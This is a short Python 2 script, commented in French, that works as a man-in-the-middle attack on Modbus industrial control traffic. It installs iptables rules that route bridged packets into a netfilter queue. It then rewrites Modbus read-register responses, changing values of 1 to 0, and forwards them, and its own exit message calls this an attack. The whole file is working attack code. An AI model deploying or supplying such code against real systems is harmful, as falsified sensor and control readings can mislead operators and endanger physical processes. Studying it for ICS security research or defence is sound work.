#!/usr/bin/python2
# -*- coding: utf-8 -*
# G.Monarque 2019 - Contact using github

from scapy.all import *
from netfilterqueue import NetfilterQueue
# from EmulModbus import *
from scapy.contrib.modbus import *
import os


iptablesr1 = "iptables -A FORWARD -m physdev --physdev-in enx0050b6252ca0 -j NFQUEUE --queue-num 0"
iptablesr2 = "iptables -A FORWARD -m physdev --physdev-out enx0050b6252ca0 -j NFQUEUE --queue-num 0"
print("Ajout regle iptables :")
print(iptablesr1)
print(iptablesr2)
os.system(iptablesr1)
os.system(iptablesr2)


def modify(packet):
	pkt = IP(packet.get_payload())
	val = 1
	newval = 0
	try:
		if(pkt["ModbusADUResponse"].funcCode == 3):
			print("Paquet modbus modifie")
			print (pkt["ModbusADUResponse"].registerVal)
			for i in range(len(pkt["ModbusADUResponse"].registerVal)):
				if pkt["ModbusADUResponse"].registerVal[i] == val :
					pkt["ModbusADUResponse"].registerVal[i] = newval
			packet.set_payload(str(pkt))
			print (pkt["ModbusADUResponse"].registerVal)
			print("---------------------------------")	 	
	except Exception as e:
		pass
	packet.accept()


def main():
	nfqueue = NetfilterQueue()
	nfqueue.bind(0, modify)
	try:
		print "[+] En attente de paquets"
		nfqueue.run() 
	except KeyboardInterrupt:
		nfqueue.unbind()
		print("[-] Fin de l'attaque")
		os.system('iptables -D FORWARD -m physdev --physdev-in enx0050b6252ca0 -j NFQUEUE --queue-num 0')
		os.system('iptables -D FORWARD -m physdev --physdev-out enx0050b6252ca0 -j NFQUEUE --queue-num 0')
		os.system('iptables -X')

if __name__ == "__main__":
	main()
			
